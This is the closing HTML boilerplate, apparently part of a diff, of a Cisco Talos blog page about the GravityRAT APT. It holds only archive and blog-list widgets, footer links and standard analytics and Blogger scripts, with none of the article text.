+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(12)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(6)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(7)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(6)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+                          &#9658;&#160;
+                        
+</span>
+</a>
+<a class='post-count-link' href='https://blog.talosintelligence.com/2008/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogArchive1"));' rel='nofollow' target='configBlogArchive1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget BlogList' data-version='1' id='BlogList1'>
+<h2 class='title'>Recommended Blogs</h2>
+<div class='widget-content'>
+<div class='blog-list-container' id='BlogList1_container'>
+<ul id='BlogList1_blogs'>
+<li style='display: block;'>
+<div class='blog-icon'>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='https://blogs.cisco.com' target='_blank'>
+Cisco Blog</a>
+</div>
+<div class='item-content'>
+<span class='item-title'>
+<a href='https://blogs.cisco.com/healthcare/vaccines-to-vaccinations-towards-collaboration-in-vaccine-administration' target='_blank'>
+Vaccines to Vaccinations: Towards collaboration in vaccine administration
+</a>
+</span>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='https://blog.snort.org/' target='_blank'>
+Snort Blog</a>
+</div>
+<div class='item-content'>
+<span class='item-title'>
+<a href="https://feedproxy.google.com/~r/Snort/~3/8vKeGxY7KPc/snort-rule-update-for-may-20-2021.html" target='_blank'>
+Snort rule update for May 20, 2021
+</a>
+</span>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='http://blog.clamav.net/' target='_blank'>
+ClamAV&#174; blog</a>
+</div>
+<div class='item-content'>
+<span class='item-title'>
+<a href="https://feedproxy.google.com/~r/Clamav/~3/HLo75DA2w0E/clamav-devel-github-repository-name.html" target='_blank'>
+"clamav-devel" GitHub repository name change to "clamav"
+</a>
+</span>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+</ul>
+<div class='clear'></div>
+<span class='widget-item-control'>
+<span class='item-control blog-admin'>
+<a class='quickedit' onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogList1"));' rel='nofollow' target='configBlogList1' title='Edit'>
+<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+</a>
+</span>
+</span>
+<div class='clear'></div>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer id='footer'>
+<div class='container'>
+<div class='row footer_nav_wrapper'>
+<div class='col-md-9 col-sm-12'>
+<ul class='footer_nav'>
+<li class='list_col'>
+<ul class='nopad'>
+<li class='nopad'>
+<ul class='pad first top'>
+<li>
+<a href='https://talosintelligence.com/software'>Software</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/reputation_center'>Reputation Center</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/vulnerability_info'>Vulnerability Information</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/ms_advisories'>Microsoft Advisory Snort Rules</a>
+</li>
+</ul>
+</li>
+<li class='list_col'>
+<ul class='pad second'>
+<li>
+<a href='https://www.talosintelligence.com/incident_response' target='_blank'>Incident Response</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/amp-naming'>AMP Naming Conventions</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/talos_file_reputation'>Talos File Reputation</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/awbo_intro'>AWBO Exercises</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class='list_col'>
+<ul class='nopad'>
+<li class='nopad'>
+<ul class='pad first last'>
+<li>
+<a href='https://talosintelligence.com/resources'>Library</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/community'>Support Communities</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/about'>About</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/careers'>Careers</a>
+</li>
+</ul>
+</li>
+<li class='list_col'>
+<ul class='pad second last'>
+<li>
+<a href='https://blog.talosintelligence.com'>Blog</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/newsletters'>Threat Source Newsletter</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/podcasts/shows/beers_with_talos'>Beers with Talos Podcast</a>
+</li>
+<li>
+<a href='https://talosintelligence.com/podcasts/shows/talos_takes'>Talos Takes Podcast</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class='col-md-3 col-sm-12 connect_social'>
+<h5>Connect With Us</h5>
+<ul>
+<li>
+<a href='https://twitter.com/talossecurity' target='_blank'>
+<img alt='Follow us on Twitter' src='https://www.talosintelligence.com/assets/footer_icon_tw.svg'/>
+</a>
+</li>
+<li>
+<a href='https://www.youtube.com/playlist?list=PLFT-9JpKjRTDn_qtGN238gzycJfaVzMqD' target='_blank'>
+<img alt='Watch our informational videos on YouTube' src='https://www.talosintelligence.com/assets/footer_icon_yt.svg'/>
+</a>
+</li>
+<li>
+<a href='https://www.linkedin.com/company/cisco-talos-intelligence-group/' target='_blank'>
+<img alt='Connect with us on LinkedIn' src='https://www.talosintelligence.com/assets/footer_icon_li.svg'/>
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class='row'>
+<div class='col-xs-12 footer_corporate'>
+<a href="https://tools.cisco.com/security/center/home.x" target='_blank'>
+<img alt='Cisco' src='https://www.talosintelligence.com/assets/logo_cisco_grey.svg'/>
+</a>
+<p class='copyright'>&#169; <span id='copyright-year'></span> Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our 
+			<a class='copyright-underline underline' href='https://www.cisco.com/web/siteassets/legal/privacy_full.html' target='_blank'>Privacy Policy</a> here.
+		</p>
+<script type='text/javascript'>
+			document.getElementById('copyright-year').appendChild(document.createTextNode(new Date().getFullYear())) 
+		</script>
+</div>
+</div>
+</div>
+</footer>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-30016562-3', 'auto');
+  ga('send', 'pageview');
+
+ 
+
+</script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/3464975383-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY7kWEO4vn7JCwA8dfJ_W1Yt8VBlVA:1621734547734';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d1029833275466591797','//blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html','1029833275466591797');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '1029833275466591797', 'title': 'Cisco Talos Intelligence Group - Comprehensive Threat Intelligence', 'url': 'https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html', 'canonicalUrl': 'http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html', 'homepageUrl': 'https://blog.talosintelligence.com/', 'searchUrl': 'https://blog.talosintelligence.com/search', 'canonicalHomepageUrl': 'http://blog.talosintelligence.com/', 'blogspotFaviconUrl': 'https://blog.talosintelligence.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': false, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': 'UA-30016562-3', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom\x22 href\x3d\x22https://blog.talosintelligence.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - RSS\x22 href\x3d\x22https://blog.talosintelligence.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/1029833275466591797/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom\x22 href\x3d\x22https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/951198144-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/751ccdc09ff31f1f', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '6188594294975286687', 'postImageThumbnailUrl': 'https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s72-c/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg', 'postImageUrl': 'https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s640/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg', 'pageName': 'GravityRAT - The Two-Year Evolution Of An APT Targeting India', 'pageTitle': 'Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: GravityRAT - The Two-Year Evolution Of An APT Targeting India', 'metaDescription': ''}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'GravityRAT - The Two-Year Evolution Of An APT Targeting India', 'description': 'A blog from the world class Intelligence Group, Talos, Cisco\x27s Intelligence Group', 'featuredImage': 'https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s640/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg', 'url': 'https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 6188594294975286687}}]);
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar', document.getElementById('HTML1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar', document.getElementById('HTML2'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_SubscribeView', new _WidgetInfo('Subscribe1', 'sidebar', document.getElementById('Subscribe1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogListView', new _WidgetInfo('BlogList1', 'sidebar', document.getElementById('BlogList1'), {'numItemsToShow': 0, 'totalItems': 3}, 'displayModeFull'));
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"653aa039d8001972","token":"35f8ae698f9d471b83b846a751388737","version":"2021.5.1","si":10}'></script>
+</body>
+</html>
